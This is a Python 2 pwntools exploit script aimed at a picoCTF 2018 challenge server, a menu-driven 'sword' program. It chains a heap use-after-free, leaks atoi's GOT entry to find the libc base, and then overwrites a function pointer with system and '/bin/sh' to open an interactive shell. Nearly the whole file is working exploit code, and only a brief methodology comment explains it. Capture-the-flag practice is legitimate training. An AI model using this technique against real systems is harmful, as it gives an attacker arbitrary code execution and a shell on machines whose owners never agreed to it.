#!/bin/python2
from pwn import *
import re
import binascii

context.terminal = ["termite", "-e"]

def alloc(p):
    p.clean()
    p.sendline("1")
    idx = p.recvline_contains("sword index is")
    idx = idx.split(' ')
    idx = idx[len(idx)-1]
    idx = idx.split('.')[0]
    log.info('Alloc\'d: ' + idx)
    return idx

def harden(p, i, length, name):
    p.clean()
    p.sendline("5")
    p.sendlineafter("What's the index of the sword?", i)
    p.sendlineafter("What's the length of the sword name?", length)
    p.sendlineafter("Plz input the sword name.", name)
    p.sendlineafter("What's the weight of the sword?", "-1")

def leak_libc(p, i):
    p.clean()
    p.sendline("6")
    p.sendlineafter("What's the index of the sword?", i)
    dat = p.recvuntil('.....')
    log.info(dat)
    name = dat[13:19]
    hname = binascii.hexlify(name[::-1])
    test = struct.unpack("L", name+"\x00\x00")
    libc = hex(int(test[0]))
    return libc

def use_func(p, i):
    p.clean()
    p.sendline("6")
    p.sendlineafter("What's the index of the sword?", i)

def free(p, i):
    p.clean()
    p.sendline("4")
    p.sendlineafter("What's the index of the sword?", i)
    log.info("Object: " + i + " is free and slot is open")

def fake_free(p, i):
    p.clean()
    p.sendline("5")
    p.sendlineafter("What's the index of the sword?", i)
    p.sendlineafter("What's the length of the sword name?", "300")
    log.info("Object: " + i + " is free")

def break_heap():
    p = remote('2018shell1.picoctf.com', 44116)
    ''' Methodology:
        1). Use after free overwrite A->name with got entry of atoi
        2). Read A->name for atoi@got
        3). Use atoi@got to get libc base to find system address
        4). UAF exploit with system address

    '''

    A = alloc(p)
    B = alloc(p)
    C = alloc(p)
    D = alloc(p)

    fake_free(p, A)
    atoi_plt = struct.pack("L", 0x602078)
    hoo = struct.pack("L", 0x400b9d)
    harden(p, B, "24", "\x08"+"\x00"*7+atoi_plt+hoo)

    base = int(leak_libc(p, A), 16) - 0x36e80
    sys = base + 0x45390
    sh = base + 0x18CD57
    log.info("libc base: " + hex(base))
    log.info("system@got: " + hex(sys))
    log.info("/bin/sh: " + hex(sh))
    fake_free(p, C)
    harden(p, D, "24", "\x07"+"\x00"*7+struct.pack("L", sh)+struct.pack("L", sys))
    use_func(p, C)
    p.interactive()


break_heap()
